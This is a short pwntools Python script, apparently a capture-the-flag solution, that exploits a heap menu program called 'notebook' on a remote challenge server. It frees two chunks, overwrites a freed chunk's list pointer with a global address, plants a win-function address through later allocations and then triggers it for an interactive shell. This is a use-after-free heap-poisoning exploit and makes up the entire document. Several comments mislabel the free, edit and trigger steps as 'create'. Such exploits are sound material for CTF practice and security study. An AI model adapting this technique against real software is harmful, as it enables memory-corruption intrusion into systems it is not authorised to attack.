#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./notebook', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def conn():
    if args.REMOTE:
        return remote('localhost', 1337)
    return process(elf.path)

p = remote("offsec.m0lecon.it", 13543)

ghand_addr = 0x4040c0
win_addr = 0x401306

#create slot A
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'1') # index
p.sendlineafter(b'data: ', b'hello1') #  Data

#create slot B
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'2') # index
p.sendlineafter(b'data: ', b'hello2') #  Data

#free slot A
p.sendlineafter(b'> ', b'2') # create
p.sendlineafter(b'index: ', b'1') # index


#free slot B
p.sendlineafter(b'> ', b'2') # create
p.sendlineafter(b'index: ', b'2') # index


payload1 = flat(
    p64(ghand_addr)
        )

#edit slot B
p.sendlineafter(b'> ', b'3') # create
p.sendlineafter(b'index: ', b'2') # index
p.sendlineafter(b'data: ', payload1) #  Data

payload2 = flat (
        p64(win_addr)
        )

#create slot C
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'3') # index
p.sendlineafter(b'data: ', payload2) #  Data

#create slot D 
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'4') # index
p.sendlineafter(b'data: ', payload2)

#create slot E
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'5') # index
p.sendlineafter(b'data: ', payload2)


#trigger slot
p.sendlineafter(b'> ', b'5') # create


p.interactive()
